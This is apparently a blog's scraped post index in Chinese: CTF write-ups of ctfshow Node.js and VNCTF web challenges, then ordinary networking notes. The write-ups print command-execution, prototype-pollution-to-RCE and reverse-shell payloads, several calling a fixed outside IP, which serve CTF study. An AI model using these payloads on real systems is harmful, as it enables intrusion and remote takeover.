函数构造器就像javascript给出的最高函数，它可以访问全局范围，因此它可以返回任何全局的东西。 函数构造器允许你从一个字符串中生成一个函数，从而执行任意代码。 上述代码在执行时，this 指向 ctx 并通过原型链的方式拿到沙盒外的 Funtion，vm 虚拟机环境中的代码逃逸，获得了主线程的 process 变量，并调用 process.exit()，造成主程序非正常退出。 所以我们能够用process变量来做更多的东西 或者这样 参考文章 ctfshow—Node.js漏洞总结_cosmoslin的博客-CSDN博客 node.js 沙盒逃逸分析 - JavaShuo 你终于回来了(。・∀・)ノ (cnblogs.com) Node.js 常见漏洞学习与总结 - 先知社区 (aliyun.com) CTFSHOW nodejs部分web334 用户名不为CTFSHOW,还要经过大写转换后等于CTFSHOW,所以传入ctfshow密码为123456就行 web335js的命令执行 可以使用chile_process.exec来间接调用/bash.sh。它是一个bash解释器，可以执行系统命令。在eval函数的参数中可以构造require(&#39;child_process&#39;).exec(&#39;&#39;);来进行调用。 exec因为返回值的问题没法利用 所以这里可以用execSync eval=require(&#39;child_process&#39;).execSync(&#39;ls&#39;) eval=require(&#39;child_process&#39;).execSync(&#39;cat fl00g.txt&#39;) 或者spawnSync eval=require(&#39;child_process&#39;).spawnSync(&#39;ls&#39;).stdout.toString() eval=require(&#39;child_process&#39;).spawnSync(&#39;cat&#39;,[&#39;fl00g.txt&#39;]).stdout.toString() 还可以用global.process.mainModule.constructor._load替代require eval=global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;ls&#39;) web336过滤了exec 但是可以用spawnSync 还可以利用fs模块文件操作 eval&#x3D;require(&#39;fs&#39;).readdirSync(&#39;.&#39;); eval&#x3D;require(&#39;fs&#39;).readFileSync(&#39;fl001g.txt&#39;); web337数组绕过，但是不同于php的数组绕过 var express &#x3D; require(&#39;express&#39;); var router &#x3D; express.Router(); var crypto &#x3D; require(&#39;crypto&#39;); function md5(s) &#123; return crypto.createHash(&#39;md5&#39;) .update(s) .digest(&#39;hex&#39;); &#125; &#x2F;* GET home page. *&#x2F; router.get(&#39;&#x2F;&#39;, function(req, res, next) &#123; res.type(&#39;html&#39;); var flag&#x3D;&#39;xxxxxxx&#39;; var a &#x3D; req.query.a; var b &#x3D; req.query.b; if(a &amp;&amp; b &amp;&amp; a.length&#x3D;&#x3D;&#x3D;b.length &amp;&amp; a!&#x3D;&#x3D;b &amp;&amp; md5(a+flag)&#x3D;&#x3D;&#x3D;md5(b+flag))&#123; res.end(flag); &#125;else&#123; res.render(&#39;index&#39;,&#123; msg: &#39;tql&#39;&#125;); &#125; &#125;); module.exports &#x3D; router; 传入a和b两个参数，长度相同但并不相等，同时拼接上flag的md5值相同 js有个很奇怪的特性 不能直接比较两个数组 而且拼接字符串时也有个特性 也就是说我们传入a[]=1&amp;b[]=1就能完美满足if判断得到flag 而如果我们传入的是非数字索引，那么他就会变成js中的对象 对象的拼接又有这种特性 所以我们传入a[x]=1&amp;b[x]=2同样可以满足if判断拿到flag web338common.js里有copy函数 猜测是原型链污染 看login.js 让secert的ctfshow属性等于36dboy {&quot;_proto_&quot;:{&quot;ctfshow&quot;:&quot;36dboy&quot;}} 抓包之后改一下 web339非预期解：利用ejs模板rce漏洞 羽师傅的payload： &#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_llama1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \\&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;117.50.172.142&#x2F;8082 0&gt;&amp;1\\&quot;&#39;);var _llama2&quot;&#125;&#125; 反弹之前可以先关一下服务器的防火墙systemctl stop firewalld 几个node模板引擎的原型链污染分析 | L0nm4r (lonmar.cn) CVE-2020-7699漏洞分析_gental_z的博客-CSDN博客 预期解： 登录部分 同样的copy函数 这里要求ctfshow=flag的内容，可我们并不知道flag 我们再看看api.js 如果我们可以利用原型链控制query的值，那么就能实现反弹shell的操作 但是这个是变量不是变量的属性，也能污染吗 答案是可以的 因为所有变量的最顶层都是object，当前环境没有，它会直接去寻找Object对象的属性当中是否有这个键值对是否存在 所以我们可以构造payload &#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c \\&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;服务器IP&#x2F;监听端口 0&gt;&amp;1\\&quot;&#39;)&quot;&#125;&#125; 然后访问一下api页面触发query web340登录部分 copy函数： 这道题与web339利用点是相同的，我们同样要利用原型链污染来控制query的值达到反弹shell的目的。但是需要向上污染两级才能到达Object对象 所以我们的payload为 &#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c \\&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;服务器IP&#x2F;监听端口 0&gt;&amp;1\\&quot;&#39;)&quot;&#125;&#125;&#125; 同样传入之后访问一下api页面就行 web341没有了api.js 所以只能用web339的那个非预期解，只是要跟web340一样向上污染两级 &#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_llama1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \\&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;117.50.172.142&#x2F;8082 0&gt;&amp;1\\&quot;&#39;);var _llama2&quot;&#125;&#125;&#125; web342-web343同样是模板引擎的rce，不过不是之前的ejs，而是jade 再探 JavaScript 原型链污染到 RCE - 先知社区 (aliyun.com) 几个node模板引擎的原型链污染分析 | L0nm4r (lonmar.cn) ejs原型污染rce分析 - 先知社区 (aliyun.com) 用一个payload都能打 &#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;type&quot;:&quot;Code&quot;,&quot;self&quot;:1,&quot;line&quot;:&quot;global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;bash -c \\&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;117.50.172.142&#x2F;8082 0&gt;&amp;1\\&quot;&#39;)&quot;&#125;&#125;&#125; web344代码： router.get(&#39;&#x2F;&#39;, function(req, res, next) &#123; res.type(&#39;html&#39;); var flag &#x3D; &#39;flag_here&#39;; if(req.url.match(&#x2F;8c|2c|\\,&#x2F;ig))&#123; res.end(&#39;where is flag :)&#39;); &#125; var query &#x3D; JSON.parse(req.query.query); if(query.name&#x3D;&#x3D;&#x3D;&#39;admin&#39;&amp;&amp;query.password&#x3D;&#x3D;&#x3D;&#39;ctfshow&#39;&amp;&amp;query.isVIP&#x3D;&#x3D;&#x3D;true)&#123; res.end(flag); &#125;else&#123; res.end(&#39;where is flag. :)&#39;); &#125; &#125;); 如果没有过滤，那么我们直接传入 ?query&#x3D;&#123;&quot;name&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;ctfshow&quot;,&quot;isVIP&quot;:true&#125; 就行，但是题目把逗号和他的url编码过滤了 这时就要尝试用&amp;绕过 nodejs 会把同名参数以数组的形式存储，并且 JSON.parse 可以正常解析 所以最终payload为 ?query&#x3D;&#123;&quot;name&quot;:&quot;admin&quot;&amp;query&#x3D;&quot;password&quot;:&quot;%63tfshow&quot;&amp;query&#x3D;&quot;isVIP&quot;:true&#125; 把c也编码的原因是防止和双引号的url编码构成%22c","categories":[],"tags":[{"name":"web学习","slug":"web学习","permalink":"https://ethe448.github.io/tags/web%E5%AD%A6%E4%B9%A0/"}]},{"title":"VNCTF复现","slug":"VNCTF复现","date":"2022-02-13T14:34:31.000Z","updated":"2022-04-25T12:57:21.306Z","comments":true,"path":"2022/02/13/VNCTF复现/","link":"","permalink":"https://ethe448.github.io/2022/02/13/VNCTF%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"webGameV4.0纯签到题 源码里找flag base64解码 gocalc0非预期解： &#123;&#123;.&#125;&#125; 查源码 flag在/flag路径，尝试去访问 然后提示flag在session中 对session进行base64解码(第二次解码如果全放进去解不出内容，要一点一点试) 预期解： 拿到源码之后根据源码写个exp package main import ( _ &quot;embed&quot; &quot;fmt&quot; &quot;os&quot; &quot;reflect&quot; &quot;strings&quot; &quot;text&#x2F;template&quot; &quot;github.com&#x2F;gin-contrib&#x2F;sessions&quot; &quot;github.com&#x2F;gin-contrib&#x2F;sessions&#x2F;cookie&quot; &quot;github.com&#x2F;gin-gonic&#x2F;gin&quot; &quot;github.com&#x2F;maja42&#x2F;goval&quot; ) &#x2F;&#x2F;go:embed template&#x2F;index.html var tpl string &#x2F;&#x2F;go:embed main.go var source string type Eval struct &#123; E string &#96;json:&quot;e&quot; form:&quot;e&quot; binding:&quot;required&quot;&#96; &#125; func (e Eval) Result() (string, error) &#123; eval :&#x3D; goval.NewEvaluator() result, err :&#x3D; eval.Evaluate(e.E, nil, nil) if err !&#x3D; nil &#123; return &quot;&quot;, err &#125; t :&#x3D; reflect.ValueOf(result).Type().Kind() if t &#x3D;&#x3D; reflect.Int &#123; return fmt.Sprintf(&quot;%d&quot;, result.(int)), nil &#125; else if t &#x3D;&#x3D; reflect.String &#123; return result.(string), nil &#125; else &#123; return &quot;&quot;, fmt.Errorf(&quot;not valid type&quot;) &#125; &#125; func (e Eval) String() string &#123; res, err :&#x3D; e.Result() if err !&#x3D; nil &#123; fmt.Println(err) res &#x3D; &quot;invalid&quot; &#125; return fmt.Sprintf(&quot;%s &#x3D; %s&quot;, e.E, res) &#125; func render(c *gin.Context) &#123; session :&#x3D; sessions.Default(c) var his string if session.Get(&quot;history&quot;) &#x3D;&#x3D; nil &#123; his &#x3D; &quot;&quot; &#125; else &#123; his &#x3D; session.Get(&quot;history&quot;).(string) &#125; fmt.Println(strings.ReplaceAll(tpl, &quot;&#123;&#123;result&#125;&#125;&quot;, his)) t, err :&#x3D; template.New(&quot;index&quot;).Parse(strings.ReplaceAll(tpl, &quot;&#123;&#123;result&#125;&#125;&quot;, his)) if err !&#x3D; nil &#123; fmt.Println(err) c.String(500, &quot;internal error&quot;) return &#125; if err :&#x3D; t.Execute(c.Writer, map[string]string&#123; &quot;s0uR3e&quot;: source, &#125;); err !&#x3D; nil &#123; fmt.Println(err) &#125; &#125; func main() &#123; port :&#x3D; os.Getenv(&quot;PORT&quot;) if port &#x3D;&#x3D; &quot;&quot; &#123; port &#x3D; &quot;8080&quot; &#125; r :&#x3D; gin.Default() store :&#x3D; cookie.NewStore([]byte(&quot;woW_you-g0t_sourcE_co6e&quot;)) r.Use(sessions.Sessions(&quot;session&quot;, store)) r.GET(&quot;&#x2F;&quot;, func(c *gin.Context) &#123; render(c) &#125;) r.GET(&quot;&#x2F;flag&quot;, func(c *gin.Context) &#123; session :&#x3D; sessions.Default(c) session.Set(&quot;FLAG&quot;, os.Getenv(&quot;FLAG&quot;)) session.Save() c.String(200, &quot;flag is in your session&quot;) &#125;) r.POST(&quot;&#x2F;&quot;, func(c *gin.Context) &#123; session :&#x3D; sessions.Default(c) var his string if session.Get(&quot;history&quot;) &#x3D;&#x3D; nil &#123; his &#x3D; &quot;&quot; &#125; else &#123; his &#x3D; session.Get(&quot;history&quot;).(string) &#125; eval :&#x3D; Eval&#123;&#125; if err :&#x3D; c.ShouldBind(&amp;eval); err &#x3D;&#x3D; nil &#123; his &#x3D; his + eval.String() + &quot;&lt;br&#x2F;&gt;&quot; &#125; session.Set(&quot;history&quot;, his) session.Save() render(c) &#125;) r.Run(fmt.Sprintf(&quot;:%s&quot;, port)) &#125; exp： package main import ( _ &quot;embed&quot; &quot;fmt&quot; &quot;github.com&#x2F;gin-contrib&#x2F;sessions&quot; &quot;github.com&#x2F;gin-contrib&#x2F;sessions&#x2F;cookie&quot; &quot;github.com&#x2F;gin-gonic&#x2F;gin&quot; &quot;os&quot; ) func main() &#123; port :&#x3D; os.Getenv(&quot;PORT&quot;) if port &#x3D;&#x3D; &quot;&quot; &#123; port &#x3D; &quot;8080&quot; &#125; r :&#x3D; gin.Default() store :&#x3D; cookie.NewStore([]byte(&quot;woW_you-g0t_sourcE_co6e&quot;)) r.Use(sessions.Sessions(&quot;session&quot;, store)) r.GET(&quot;&#x2F;&quot;, func(c *gin.Context) &#123; session :&#x3D; sessions.Default(c) println(session.Get(&quot;FLAG&quot;).(string)) &#125;) r.Run(fmt.Sprintf(&quot;:%s&quot;, port)) &#125; 这部分等学了go之后再看看，先放着 newcalc0考点：原型污染通过 console.table 属性（低）（CVE-2022-21824） 由于 console.table() 函数的格式化逻辑，允许用户控制的输入传递给 properties 参数同时传递一个是不安全的具有至少一个属性作为第一个参数的普通对象，可以是__proto__. 原型污染的控制非常有限，因为它只允许为对象原型的数字键分配一个空字符串。 exp： console.table([&#123; x : 1 &#125;], [ &quot;__proto__&quot; ]); easyJava存在任意文件读取 读不到flag，应该是要通过调用readflag来读取flag file?url&#x3D;file:&#x2F;&#x2F;&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;ROOT&#x2F;WEB-INF&#x2F;classes&#x2F; 反编译看一下源码 Secr3t.jad &#x2F;&#x2F; Decompiled by Jad v1.5.8g. Copyright 2001 Pavel Kouznetsov. &#x2F;&#x2F; Jad home page: http:&#x2F;&#x2F;www.kpdus.com&#x2F;jad.html &#x2F;&#x2F; Decompiler options: packimports(3) &#x2F;&#x2F; Source File Name: Secr3t.java package util; import java.io.*; import org.apache.commons.lang3.RandomStringUtils; public class Secr3t &#123; private Secr3t() &#123; &#125; public static String getKey() &#123; return Key; &#125; public static StringBuffer getFlag() &#123; InputStream in; BufferedReader read; Flag &#x3D; new StringBuffer(); in &#x3D; null; try &#123; in &#x3D; Runtime.getRuntime().exec(&quot;&#x2F;readflag&quot;).getInputStream(); &#125; catch(IOException e) &#123; e.printStackTrace(); &#125; read &#x3D; new BufferedReader(new InputStreamReader(in)); for(String line &#x3D; null; (line &#x3D; read.readLine()) !&#x3D; null;) Flag.append((new StringBuilder()).append(line).append(&quot;\\n&quot;).toString()); IOException e; try &#123; in.close(); read.close(); &#125; &#x2F;&#x2F; Misplaced declaration of an exception variable catch(IOException e) &#123; e.printStackTrace(); System.out.println(&quot;Secr3t : io exception!&quot;); &#125; break MISSING_BLOCK_LABEL_176; e; e.printStackTrace(); try &#123; in.close(); read.close(); &#125; &#x2F;&#x2F; Misplaced declaration of an exception variable catch(IOException e) &#123; e.printStackTrace(); System.out.println(&quot;Secr3t : io exception!&quot;); &#125; break MISSING_BLOCK_LABEL_176; Exception exception; exception; try &#123; in.close(); read.close(); &#125; catch(IOException e) &#123; e.printStackTrace(); System.out.println(&quot;Secr3t : io exception!&quot;); &#125; throw exception; return Flag; &#125; public static boolean check(String checkStr) &#123; return &quot;vnctf2022&quot;.equals(checkStr); &#125; private static final String Key &#x3D; RandomStringUtils.randomAlphanumeric(32); private static StringBuffer Flag; &#125; HelloWorldServlet.jad package servlet; import javax.servlet.annotation.*; import entity.*; import javax.servlet.http.*; import java.io.*; import java.util.*; import util.*; import javax.servlet.*; @WebServlet(name &#x3D; &quot;HelloServlet&quot;, urlPatterns &#x3D; &#123; &quot;&#x2F;evi1&quot; &#125;)&#x2F;&#x2F;比赛的时候用的jad反编译的没这块，虽然之后查日志找到了路径 public class HelloWorldServlet extends HttpServlet &#123; private volatile String name; private volatile String age; private volatile String height; User user; public HelloWorldServlet() &#123; this.name &#x3D; &quot;m4n_q1u_666&quot;; this.age &#x3D; &quot;666&quot;; this.height &#x3D; &quot;180&quot;; &#125; public void init() throws ServletException &#123; this.user &#x3D; new User(this.name, this.age, this.height); &#125; protected void doGet(final HttpServletRequest req, final HttpServletResponse resp) throws ServletException, IOException &#123; final String reqName &#x3D; req.getParameter(&quot;name&quot;); if (reqName !&#x3D; null) &#123; this.name &#x3D; reqName; &#125; if (Secr3t.check(this.name)) &#123; this.Response(resp, &quot;no vnctf2022!&quot;); return; &#125; if (Secr3t.check(this.name)) &#123; this.Response(resp, &quot;The Key is &quot; + Secr3t.getKey()); &#125; &#125; protected void doPost(final HttpServletRequest req, final HttpServletResponse resp) throws ServletException, IOException &#123; final String key &#x3D; req.getParameter(&quot;key&quot;); final String text &#x3D; req.getParameter(&quot;base64&quot;); if (Secr3t.getKey().equals(key) &amp;&amp; text !&#x3D; null) &#123; final Base64.Decoder decoder &#x3D; Base64.getDecoder(); final byte[] textByte &#x3D; decoder.decode(text); final User u &#x3D; (User)SerAndDe.deserialize(textByte); if (this.user.equals((Object)u)) &#123; this.Response(resp, &quot;Deserialize\\u2026\\u2026 Flag is &quot; + Secr3t.getFlag().toString()); &#125; &#125; else &#123; this.Response(resp, &quot;KeyError&quot;); &#125; &#125; private void Response(final HttpServletResponse resp, final String outStr) throws IOException &#123; final ServletOutputStream out &#x3D; resp.getOutputStream(); out.write(outStr.getBytes()); out.flush(); out.close(); &#125; &#125; 留个坑，不会了，暑假开始学java再来补（","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://ethe448.github.io/tags/ctf/"}]},{"title":"ict学习笔记","slug":"ict学习笔记","date":"2022-01-24T04:01:19.000Z","updated":"2022-03-28T08:22:24.242Z","comments":true,"path":"2022/01/24/ict学习笔记/","link":"","permalink":"https://ethe448.github.io/2022/01/24/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"","text":"数据通信网络基础概念通信：人与人，人与物，物与物之间通过某种媒介和行为进行的信息传递与交流 网络通信：终端设备之间通过计算机网络进行的通信 信息传递过程 数据被打包成原始的数据载荷，并添加一定信息(目的地址)的头部和尾部形成报文(封装)，报文通过网线到达网关，网关对报文进行&quot;解封装&quot;，读取目的地址，再重新封装，根据不同的目的地址送往不同的路由器，报文由此离开本地网络，进入internet的干道进行传输，后进入目的地址所在的本地链路，由本地链路的网关或路由器再进行解封装和封装，并根据目的地址觉得发往相应的下一台路由器，最终到达目的计算机所在的网络的网关，再进行解封装和封装，根据目的地址发往相应的计算机。计算机收到报文后对其进行校验处理，校验无误后，接收报文，并将其中的数据载荷交由相应的应用程序进行处理。 常见术语 • 数据载荷：可以理解为最终想要传递的信息，但实际上，在具有层次化结构的通信过程中， 上一层协议传递给下一层协议的数据单元（报文）都可以称之为下一层协议的数据载荷。 • 报文：网络中交换与传输的数据单元，具有一定的内在格式，通常都具有头部+数据载荷+ 尾部的基本结构。传输过程中，报文的格式和内容可能发生改变。 • 头部：为了更好的传递信息，在组装报文时，在数据载荷的前面添加的信息段统称为报文 的头部。 • 尾部：为了更好的传递信息，在组装报文时，在数据载荷的后面添加的信息段统称为报文 的尾部。注意，很多报文是没有尾部的。 • 封装：分层协议所采用的一种技术，底层协议收到来自上层协议的消息时，将该消息附加 到底层帧的数据部分。 • 解封装：是封装的逆过程，也就是去掉报文的头部和尾部，获取数据载荷的过程。 • 网关：是在采用不同体系结构或协议的网络之间进行互通时，用于提供协议转换、路由选 择、数据交换等功能的网络设备。网关是一种根据其部署位置和功能而命名的术语，而不 是一种特定的设备类型。 • 路由器：为报文选择传递路径的网络设备。 • 终端设备：数据通信系统的端设备，作为数据的发送者或接收者，提供用户接入协议操作 所需必要功能，可以是计算机、服务器、VoIP、手机等。 基本概念数据通信网络：由路由器，交换机，防火墙，无线控制器，无线接入点，以及个人电脑，网络打印机，服务器等设备构成的通信网络。 功能：实现数据互通 网络设备交换机：距离终端用户最近的设备，用于终端用户接入网络、对数据帧进行交换 终端设备（pc，服务器等）的网络接入 二层交换 在园区网络中，交换机一般来说是距离终端用户最近的设备，接入层的交换机一般为 二层交换机，又称为以太网交换机，二层是指TCP/IP参考模型的数据链路层； 以太网交换机可以实现：数据帧的交换、终端用户设备的接入、基本的接入安全功能、 二层链路的冗余等； 广播域：一个节点发送一个广播报文其余节点都能够收到的节点的集合 路由器：网络层设备，可以在因特网中进行数据的转发 实现同类型网络或异种网络之间的通信 隔离广播域 维护路由表、运行路由协议 路径（路由信息）选择、IP报文的转发 广域网接入、网络地址转换 连接通过交换机组建的二层网络 路由器工作在TCP/IP参考模型的网络层； 路由器可以实现：维护路由表和路由信息、路由发现及路径 选择、数据转发、隔离广 播域、广域网接入和网络地址转换及特定的安全功能 防火墙：网络安全设备，用于控制两个网络之间的安全通信。通过监测、限制、更改跨越防火墙的数据流，尽可能地对外部屏蔽网络内部的信息、结构和运行状况，以此来实现对网络的安全保护 隔离不同安全级别的网络 实现不同安全级别的网络之间的访问控制（安全策略） 用户身份认真 实现远程接入功能 实现数据加密及虚拟专用网业务 执行网络地址转换 其他安全功能 是位于两个信任程度不同的网络之间（如企业内部网络和Internet之间）的设备，它 对两个网络之间的通信进行控制，通过强制实施统一的安全策略，防止对重要信息资 源的非法存取和访问，以达到保护系统安全的目的。 无线网络： ​ 无线局域网WLAN广义上是指以无线电波、激光、红外线等无线信号来代替有线局域网中 的部分或全部传输介质所构成的网络。而常见的Wi-Fi是指IEEE 802.11标准上的无线局域网 技术。 ​ 在WLAN中，常见的设备有胖AP、瘦AP和无线控制器AC。 无线接入点 (AP, Access Point） ​ 一般支持FAT AP、FIT AP和云管理工作模式，根据网络规划的需求，可以灵活地在各种模式下切换。 ​ FAT AP：适用于家庭，独立工作，需单独配置，功能较为单一，成本低。 ​ FIT AP：适用于大中型企业，需要配合AC使用，由AC统一管理和配置，功能丰富。 ​ 云管理：适用于中小型企业，需要配合云管理平台使用，由云管理平台统一管理和配置，功能丰富，即插即用。 无线接入控制器 (AC, Access Controller) ​ 一般位于整个网络的汇聚层，提供高速、安全、可靠的WLAN业务。 ​ 提供大容量、高性能、高可靠性、易安装、易维护的无线数据控制业务，具有 组网灵活、绿色节能等优势 局域网、城域网、广域网局域网：覆盖范围在几公里之内。主要作用是把分布较近的若干终端电脑连接起来，使用以太网、wi-fi等技术 城域网：较大型的局域网，成本高，传输速率快。改进了局域网的传输介质，扩大了访问范围。主要作用是将同一城市内不同地点的主机、数据库以及局域网等连接起来；与广域网作用相似，但实现方式和性能不同。基于大型的局域网，与局域网技术相似，如：以太网 (10Gbps/100Gbps)、 WiMAX (全球互通微波访问) 广域网：覆盖范围一般在几公里以上，可大至几十、几百或几千公里。主要作用是把分布较远 (如: 跨越城市、跨越国家， 等等) 的若干局域网或城域 网连接起来；会用到电信运营商的通信线路。使用HDLC、PPP等技术 网络拓扑是指用传输介质（如双绞线、光纤等）互联各种设备所呈现的结构化布局。 形态 星型网络： 所有节点通过一个中心节点连接在一起。 优点：容易在网络中增加新的节点。通信数据必须经过中心节点中转，易于实现网络 监控。 缺点：中心节点的故障会影响到整个网络的通信。 总线型网络： 所有节点通过一条总线（如同轴电缆）连接在一起。 优点：安装简便，节省线缆。某一节点的故障一般不会影响到整个网络的通信。 缺点：总线故障会影响到整个网络的通信。某一节点发出的信息可以被所有其他节点 收到，安全性低。 环形网络： 所有节点连成一个封闭的环形。 优点：节省线缆。 缺点：增加新的节点比较麻烦，必须先中断原来的环，才能插入新节点以形成新环。 树形网络： 树型结构实际上是一种层次化的星型结构。 优点：能够快速将多个星型网络连接在一起，易于扩充网络规模。 缺点：层级越高的节点故障导致的网络问题越严重 全网状网络： 所有节点都通过线缆两两互联。 优点：具有高可靠性和高通信效率。 缺点：每个节点都需要大量的物理端口，同时还需要大量的互连线缆。成本高，不易 扩展。 部分网状网络： 只是重点节点之间才两两互连。 优点：成本低于全网状网络。 缺点：可靠性比全网状网络有所降低。 在实际组网中，通常都会根据成本、通信效率、可靠性等具体需求而采用多种拓扑形态相 结合的方法。 网络工程网络工程，就是围绕着网络进行的一系列的活动，包括：网络规划、设计、实施、调试、 排错等。 网络工程设计的知识领域很宽广，其中路由和交换是计算机网络的基本 网络工程师： 网络参考模型应用和数据应用：应用的存在是为了满足人们的各种需求，伴随着应用会有信息的产生。比如文本，图片，视频等都是信息的不同呈现方式 数据：数据是各种信息的载体，大部分应用程序所产生的数据需要在不同的设备之间传递。 • 计算机只能识别0和1的组成的电子数据(digital data)。它不具备读取各种信息的能力，所 以信息需要通过一定的规则翻译成数据。 • 而对人来说，我们不具备读取电子数据的能力，所以在读取信息的时候，需要将数据转成 人能理解的信息。 • 对于一名网络工程师来说，需要更关注数据的端到端传递的过程。 OSI参考模型 OSI 模型(Open Systems Interconnection Model)，由国际化标准组织ISO (The International Organization for Standardization ) 收录在ISO 7489标准中并于1984年发布。 OSI参考模型又被称为七层模型，由下至上依次为： 物理层：在设备之间传输比特流，规定了电平、速度和电缆针脚等物理特性。 物理层：在设备之间传输比特流，规定了电平、速度和电缆针脚等物理特性。 网络层：定义逻辑地址，供路由器确定路径，负责将数据从源网络传输到目的网络。 传输层：提供面向连接或非面向连接的数据传递以及进行重传前的差错检测。 会话层：负责建立、管理和终止表示层实体之间的通信会话。该层的通信由不同设备 中的应用程序之间的服务请求和响应组成。 表示层：提供各种用于应用层数据的编码和转换功能，确保一个系统的应用层发送的 数据能被另一个系统的应用层识别。 应用层：OSI参考模型中最靠近用户的一层，为应用程序提供网络服务。 TCP/IP参考模型 结构上与OSI模型类似，采用分层架构，同时层与层之间联系紧密。 TCP/IP标准参考模型将OSI中的数据链路层和物理层合并为网络接入层，这种划分方式其实 是有悖于现实协议制定情况的，故融合了TCP/IP标准模型和OSI模型的TCP/IP对等模型被提出 TCP/IP常见协议 应用层 HTTP（Hypertext Transfer Protocol，超文本传输协议）：用来访问在网页服务器上 的各种页面。 FTP（File Transfer Protocol，文件传输协议）：为文件传输提供了途径，它允许数据从一台主机传送到另一台主机上，用于文件的下载和上传，采用C/S（Client/Server）结构。 DNS（Domain Name Service，域名称解析服务）：用于实现从主机域名到IP地址之 间的转换。 Telnet：是数据网络中提供远程登录服务的标准协议。Telnet为用户提供了在本地计算机上完成远程设备工作的能力。 传输层 TCP （Transmission Control Protocol，传输控制协议） ：为应用程序提供可靠的面向连接的通信服务。目前，许多流行的应用程序都使用TCP。 UDP（User Datagram Protocol，用户数据报协议）：提供了无连接通信，且不对传 送数据包进行可靠性的保证。 网络层 IP（Internet Protocol，互联网协议）：将传输层的数据封装成数据包并完成源站点 到目的站点的转发，提供无连接的、不可靠的服务。 IGMP（Internet Group Management Protocol，因特网组管理协议）：负责IP组播 成员管理的协议。它用来在IP主机和与其直接相邻的组播路由器之间建立、维护组播 组成员关系。 ICMP（Internet Control Message Protocol，网际报文控制协议）：基于IP协议在网 络中发送控制消息，提供可能发生在通信环境中的各种问题反馈。通过这些信息，使 管理者可以对所发生的问题作出诊断，然后采取适当的措施解决。 数据链路层 PPP（Point-to-Point Protocol，点对点协议）：一种点对点模式的数据链路层协议， 多用于广域网。 Ethernet( 以太网协议 )：一种多路访问广播型数据链路层协议，是当前应用最为广 泛的局域网技术。 PPPoE（Point-to-Point Protocol over Ethernet，以太网承载PPP协议）：PPPoE提 供通过简单桥接访问设备（接入设备）把一个网络的多个主机连接到远程访问集中器 的功能。常见的应用有家庭宽带拨号上网。 常见协议标准化组织IETF：负责开发和推广互联网协议（特别是TCP/IP协议族的协议）的志愿组织 IEEE：制定了全世界电子，电气和计算机科学领域30%左右的标准，如IEEE802.3（Ethernet）、IEEE802.11（WiFi）等。 ISO：指定计算机网络标准，如OSI模型 应用层应用层为应用软件提供接口，使应用程序能够使用网络服务。应用层协议会指定使用相应的传输层协议，以及传输层所使用的端口等。 应用层的PDU被称为Data（数据）。 TCP/IP每一层都让数据得以通过网络进行传输，这些层之间使用PDU（Packet Data Unit， 协议数据单元）彼此交换信息，确保网络设备之间能够通信。 不同层的PDU中包含有不同的信息，因此PDU在不同层被赋予了不同的名称 FTP: FTP客户端提供本地设备对远程服务器的文件进行操作的命令，用户在PC上通过应用程序作为FTP Client，并与FTP服务器建立连接后，可以对FTP Server上的文件进行操作 FTP服务器是运行FTP服务的设备，提供远程客户端访问和操作的功能，用户可以通过FTP客户端程序登录到服务器上，访问设备上的文件。 Telnet： 用户通过Telnet客户端程序连接到Telnet服务器。用户在Telnet客户端中输入命令，这些命令会在服务器端运行，就像直接在服务端的控制台输入一样 传输层传输层协议接收来自应用层的数据baoz，封装上相应的传输层头部，帮助其建立“端到端”的连接。 传输层的PDU被称为Segment（段）。 TCP和UDP报文格式 TCP报文头部： Source Port：源端口，标识哪个应用程序发送。长度为16比特。 Destination Port：目的端口，标识哪个应用程序接收。长度为16比特。 Sequence Number：序号字段。TCP链接中传输的数据流每个字节都编上一个序号。 序号字段的值指的是本报文段所发送数据的第一个字节的序号。长度为32比特。 Acknowledgment Number：确认序列号，是期望收到对方下一个报文段数据的第1 个字节的序号，即上次已成功接收到的数据段的最后一个字节数据的序号加1。只有 Ack标识为1，此字段有效。长度为32比特。 Header Length：头部长度，指出TCP报文头部长度，以32比特（4字节）为计算单位。 若无选项内容，则该字段为5，即头部为20字节。 Reserved：保留，必须填0。长度为6比特。 Control bits：控制位，包含FIN、ACK、SYN等标志位，代表不同状态下的TCP数据 段。 Window：窗口TCP的流量控制，这个值表明当前接收端可接受的最大的数据总数 （以字节为单位）。窗口最大为65535字节。长度为16比特。 Checksum：校验字段，是一个强制性的字段，由发端计算和存储，并由收端进行验 证。在计算检验和时，要包括TCP头部和TCP数据，同时在TCP报文段的前面加上12 字节的伪头部。长度为16比特。 Urgent:紧急指针，只有当URG标志置1时紧急指针才有效。TCP的紧急方式是发送端 向另一端发送紧急数据的一种方式。紧急指针指出在本报文段中紧急数据共有多少个 字节（紧急数据放在本报文段数据的最前面）。长度为16比特。 Options：选项字段（可选），长度为0-40字节。 UDP报文头部 Source Port:源端口，标识哪个应用程序发送。长度为16比特。 Source Port:源端口，标识哪个应用程序发送。长度为16比特。 Length:该字段指定UDP报头和数据总共占用的长度。可能的最小长度是8字节，因为 UDP报头已经占用了8字节。由于这个字段的存在，UDP报文总长不可能超过65535 字节（包括8字节的报头，和65527字节的数据）。 